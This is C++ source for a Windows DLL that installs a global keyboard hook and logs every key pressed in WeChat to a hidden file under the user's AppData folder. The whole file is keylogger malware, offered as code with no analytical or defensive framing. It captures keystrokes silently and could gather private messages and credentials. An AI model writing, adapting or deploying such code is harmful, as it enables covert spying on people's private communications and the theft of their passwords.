// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include <Windows.h>
#include <stdio.h>

HMODULE g_hDll;
HHOOK g_hHook;
char usr_path[64];
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		GetEnvironmentVariable("USERPROFILE", usr_path, 64);
		strcat(usr_path,"\\AppData\\Local\\key.key");
		g_hDll = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

LRESULT CALLBACK KeyboarProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char szPath[MAX_PATH];
	char* p = NULL;
	FILE* fp;
	
	char szKeyName[100];
	char szWriteText[32];

	fopen_s(&fp, usr_path, "a+");
	if (nCode >= 0 and !(lParam & 0x40000000))
	{
		GetModuleFileNameA(NULL, szPath, MAX_PATH);
		p = strrchr(szPath, '\\');
		if (!_stricmp(p + 1, "Wechat.exe"))
		{
				GetKeyNameTextA(lParam, (LPSTR)szKeyName, 100);
				
				sprintf_s(szWriteText, "%s\n", szKeyName);
				fwrite(szWriteText, 1, strlen(szWriteText), fp);
			}

	}
	fclose(fp);
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

EXTERN_C __declspec(dllexport) void HookStart()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboarProc, g_hDll, 0);
	DWORD errCode = GetLastError();
	printf("%d", errCode);
}

EXTERN_C __declspec(dllexport) void HookStop()
{
	if (g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
}

